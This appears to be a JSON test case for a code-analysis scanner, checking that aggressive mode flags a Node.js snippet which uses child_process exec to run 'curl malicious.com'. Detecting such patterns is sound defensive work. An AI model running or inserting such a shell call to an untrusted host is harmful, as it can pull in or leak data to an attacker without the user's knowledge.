{
  "name": "aggressive mode: should still detect curl command",
  "code": "\n      const { exec } = require(\"child_process\");\n      exec(\"curl malicious.com\");\n    ",
  "analyserOptions": {
    "sensitivity": "aggressive"
  }
}
